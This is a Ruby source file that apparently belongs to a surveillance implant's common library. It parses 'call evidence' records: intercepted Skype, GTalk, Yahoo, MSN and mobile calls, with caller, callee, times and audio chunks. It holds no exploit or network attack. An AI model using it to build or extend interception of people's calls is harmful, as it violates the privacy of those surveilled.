require 'rcs-common/evidence/common'

module RCS

class CallEvidence < Common::GenericEvidence

  LOG_VOICE_VERSION = 2008121901
  CHANNEL = { 0 => :INCOMING, 1 => :OUTGOING }
  PROGRAM = { 0x0141 => :SKYPE,
              0x0142 => :GTALK,
              0x0143 => :YAHOO,
              0x0144 => :MSN,
              0x0145 => :MOBILE,
              0x0146 => :SKYPE_WSAPI,
              0X0147 => :MSN_WSAPI }

  def type_id
    0x0140
  end

  def decode_additional_header(data)
    
    return nil if data.size == 0
    
    @info = {}
    @info[:version] = data.slice!(0..3).unpack("I").shift
    
    channel = data.slice!(0..3).unpack("I").shift
    @info[:channel] = CHANNEL[channel]
    @info[:program_type] = PROGRAM[data.slice!(0..3).unpack("I").shift]
    
    @info[:sample_rate] = data.slice!(0..3).unpack("I").shift
    @info[:incoming] = data.slice!(0..3).unpack("I").shift
    
    low = data.slice!(0..3).unpack("I").shift
    high = data.slice!(0..3).unpack("I").shift
    @info[:start_time] = Time.from_filetime(high, low)
    
    low = data.slice!(0..3).unpack("I").shift
    high = data.slice!(0..3).unpack("I").shift
    @info[:stop_time] = Time.from_filetime(high, low)
    
    caller_len = data.slice!(0..3).unpack("I").shift
    callee_len = data.slice!(0..3).unpack("I").shift
    
    caller_len != 0 ? @info[:caller] = data.slice!(0..caller_len-1) : @info[:caller] = ''
    @info[:caller].force_encoding('UTF-16LE').encode!('UTF-8')
    @info[:caller].lstrip!
    @info[:caller].rstrip!
    
    callee_len != 0 ? @info[:callee] = data.slice!(0..callee_len-1) : @info[:callee] = ''
    @info[:callee].force_encoding('UTF-16LE').encode!('UTF-8')
    @info[:callee].lstrip!
    @info[:callee].rstrip!
  end
  
  def decode_content(chunks)
    content = ''
    chunks.each do |c|
      content += c
    end
    return content
  end
  
end

end # RCS::